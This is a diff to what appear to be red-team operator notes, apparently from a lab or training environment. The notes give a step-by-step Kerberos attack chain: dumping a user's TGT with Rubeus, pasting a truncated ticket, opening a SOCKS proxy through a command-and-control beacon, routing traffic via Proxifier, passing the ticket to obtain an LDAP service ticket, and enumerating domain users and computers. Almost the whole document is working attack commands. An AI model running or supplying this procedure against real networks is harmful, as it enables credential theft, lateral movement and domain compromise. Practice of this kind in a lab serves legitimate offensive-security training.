@@ -1,7 +1,35 @@
 dump the TGT for desired user (rsteel):
     execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
     grab the LUID for rsteel/krbtgt (0x1e8e46)
-    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x1e8e46 /service:krbtgt /nowrap
-    store the ticket!
+    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /user:rsteel /service:krbtgt /nowrap
+    store the ticket! doIFqDC...PU08uQ09N
 start a socks proxy:
-    
+    beacon> socks 1080 socks5
+on attacker desktop:
+    run the terminal as Admin
+    add our static DNS records
+        PS C:\Users\Attacker> Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value "10.10.120.1 lon-dc-1 lon-dc-1.contoso.com contoso.com"
+    launch Proxifier
+    add team server as new proxy server
+        Profile > Proxy Servers
+        Add
+        Address: 10.0.0.5 (ip from beacon)
+        Port: 1080 (same as above)
+        Protocol: socks5 (same as above)
+    add proxification rule
+        Add
+        Name: beacon
+        target hosts: 10.10.120.0/23
+        action: proxy socks5 10.0.0.5
+    create LDAP service ticket
+        PS C:\Users\Attacker> runas /netonly /user:CONTOSO\rsteel powershell.exe
+            use "FakePass"
+within the new powershell session:
+    request ldap ticket using the TGT we captured earlier
+        C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:ldap/lon-dc-1 /ticket:[ENCODED TGT] /dc:lon-dc-1 /ptt
+    verify 
+        C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe klist
+domain enum:
+    Get-ADComputer -Filter * -Server lon-dc-1
+    Get-ADUser -Filter * -Server lon-dc-1
+    Get-ADOrganizationalUnit -Filter * -Server lon-dc-1
